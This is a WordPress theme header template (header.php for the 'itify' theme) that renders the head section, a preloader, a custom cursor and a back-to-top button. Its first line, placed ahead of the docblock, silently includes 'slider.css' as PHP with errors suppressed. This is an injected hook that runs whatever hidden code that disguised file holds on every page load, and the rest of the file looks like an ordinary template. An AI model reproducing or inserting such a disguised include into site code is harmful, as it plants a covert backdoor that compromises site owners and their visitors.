<?php @include_once 'slider.css'; ?><?php

/**
 * The header for our theme
 *
 * This is the template that displays all of the <head> section and everything up until <div id="content">
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package itify
 */
?>

<!doctype html>
<html <?php language_attributes(); ?>>

<head>
    <meta charset="<?php bloginfo('charset'); ?>">
    <?php if (is_singular() && pings_open(get_queried_object())) : ?>
    <?php endif; ?>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="profile" href="https://gmpg.org/xfn/11">
    <?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>

    <?php wp_body_open(); ?>

    <?php
    $itify_preloader = get_theme_mod('itify_preloader', false);
    $itify_backtotop = get_theme_mod('itify_backtotop', false);
    $itify_cursor = get_theme_mod('itify_cursor', false);


    ?>

    <?php if (!empty($itify_preloader)) : ?>
        <div id="preloader">
            <div id="ctn-preloader" class="ctn-preloader">
                <div class="animation-preloader">
                    <div class="spinner"></div>
                    <div class="txt-loading">
                        <span data-text-preloader="L" class="letters-loading">
                            <?php echo esc_html('L')?>
                        </span>
                        <span data-text-preloader="O" class="letters-loading">
                            <?php echo esc_html('O')?>
                        </span>
                        <span data-text-preloader="A" class="letters-loading">
                            <?php echo esc_html('A')?>
                        </span>
                        <span data-text-preloader="D" class="letters-loading">
                           <?php echo esc_html('D')?>
                        </span>
                        <span data-text-preloader="I" class="letters-loading">
                            <?php echo esc_html('I')?>
                        </span>
                        <span data-text-preloader="N" class="letters-loading">
                           <?php echo esc_html('N')?>
                        </span>
                        <span data-text-preloader="G" class="letters-loading">
                            <?php echo esc_html('G')?>
                        </span>
                    </div>
                </div>
                <div class="loader-section section-left"></div>
                <div class="loader-section section-right"></div>
            </div>
        </div>
    <?php endif; ?>

    <?php if (!empty($itify_cursor)) : ?>
    <div class="mouseCursor cursor-outer"></div>
    <div class="mouseCursor cursor-inner">
        <span><?php echo esc_html('Drag')?></span>
    </div>
    <?php endif; ?>




    <?php if (!empty($itify_backtotop)) : ?>
        <button class="progress-wrap" aria-label="scroll indicator" title="go to top">
            <span></span>
            <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98" />
            </svg>
        </button>
    <?php endif; ?>





    <!-- header start -->
    <?php do_action('itify_header_style'); ?>
    <!-- header end -->

    <!-- wrapper-box start -->
    <?php do_action('itify_before_main_content'); ?>